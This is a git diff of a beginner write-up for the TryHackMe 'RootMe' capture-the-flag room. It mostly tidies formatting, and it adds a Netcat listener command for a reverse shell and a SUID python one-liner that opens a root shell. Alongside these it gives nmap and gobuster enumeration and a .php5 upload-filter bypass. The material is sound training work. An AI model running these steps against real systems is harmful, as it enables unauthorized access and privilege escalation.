@@ -2,7 +2,6 @@
 
 A beginner-friendly walkthrough documenting the exploitation and privilege escalation steps for the RootMe room on TryHackMe.
 
-
 ---
 ## Table of Contents
 - [Enumeration](#enumeration)
@@ -14,7 +13,7 @@ A beginner-friendly walkthrough documenting the exploitation and privilege escal
 
 ## Enumeration
 
-### Nmap:
+### Nmap
 
 ```bash
 nmap -sV <ip>
@@ -30,7 +29,7 @@ As we can see from the Nmap scan, we have ports open for SSH and HTTP. The first
 
 
 
-### GoBuster:
+### GoBuster
 ```bash
 gobuster dir -u http://<ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  ```
@@ -66,7 +65,10 @@ mv shell.php shell.php5
 
 Before executing the script, we need to set up a Netcat listener on our attacking machine:
 
-> Executing the shell gave us a session as 'www-data'.
+```bash
+nc -lvnp 4444
+```
+> ✅Executing the shell gave us a session as 'www-data'.
 
  <img width="750" height="275" alt="image" src="https://github.com/user-attachments/assets/feabdb87-3745-4dab-a481-51f03aa99fad" />
 
@@ -88,7 +90,14 @@ find / -user root -perm /4000 2>/dev/null
 
 
 
-One binary that stood out as unusual was /usr/bin/python. Searching GTFOBins confirmed that Python with SUID can be exploited for privilege escalation.<br>
+
+One binary that stood out as unusual was `/usr/bin/python`.  
+
+Checking [GTFOBins](https://gtfobins.github.io/gtfobins/python/) confirmed it can be abused for privilege escalation.
+
+```bash
+/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
 
 <img width="750" height="296" alt="image" src="https://github.com/user-attachments/assets/ce77d985-6934-4304-a541-1de5f8b7b1d9" />
 
@@ -103,8 +112,9 @@ One binary that stood out as unusual was /usr/bin/python. Searching GTFOBins con
 <img width="600" height="453" alt="image" src="https://github.com/user-attachments/assets/133ac335-f5c0-4df6-be35-56a1573a4b2a" />
 
 ## Summary
-- **Enumeration:** Nmap found SSH/HTTP, GoBuster revealed `/uploads` and `/panel`.
-- **Exploitation:** Bypassed upload filter with `.php5`, gained reverse shell as `www-data`.
-- **Privilege Escalation:** Abused SUID `/usr/bin/python` → root shell.
-- **Flags:** Captured user + root.
+- 🔍 **Enumeration:** Nmap found SSH/HTTP, GoBuster revealed `/uploads` and `/panel`.
+- 💥 **Exploitation:** Bypassed upload filter with `.php5`, gained reverse shell as `www-data`.
+- ⬆️ **Privilege Escalation:** Abused SUID `/usr/bin/python` → root shell.
+- 🏁 **Flags:** Captured **user** + **root**.
+        
 
